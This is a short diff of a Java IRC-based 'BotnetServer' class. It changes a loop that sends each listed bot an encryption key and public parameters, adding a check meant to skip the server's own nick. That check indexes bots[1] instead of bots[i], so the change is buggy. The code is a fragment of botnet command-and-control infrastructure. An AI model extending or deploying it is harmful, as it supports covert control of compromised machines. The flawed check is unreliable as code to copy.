@@ -142,14 +142,16 @@ public class BotnetServer extends PircBot {
 	
 	protected void onUserList(String channel, User[] bots) {
 		for (int i = 0; i < bots.length; i++) {
-			System.out.println("\t" + bots[i].toString());
-			//TODO: fill in stuff with key stuff
-			PubInfo info = MsgEncrypt.getPubParams();
-			MsgEncrypt m = MsgEncrypt.getInstance();
-			m.setPubParams(info.toString());
-			String stuff = "key " + m.getStrKey() + " " + info.toString();
-			sendMessage(bots[i].getNick(), stuff);
-			botKeys.put(bots[i].getNick(), m);
+			if (!bots[1].getNick().equals(NAME)) {
+				System.out.println("\t" + bots[i].toString());
+				//TODO: fill in stuff with key stuff
+				PubInfo info = MsgEncrypt.getPubParams();
+				MsgEncrypt m = MsgEncrypt.getInstance();
+				m.setPubParams(info.toString());
+				String stuff = "key " + m.getStrKey() + " " + info.toString();
+				sendMessage(bots[i].getNick(), stuff);
+				botKeys.put(bots[i].getNick(), m);
+			}
 		}
 		init();
 	}
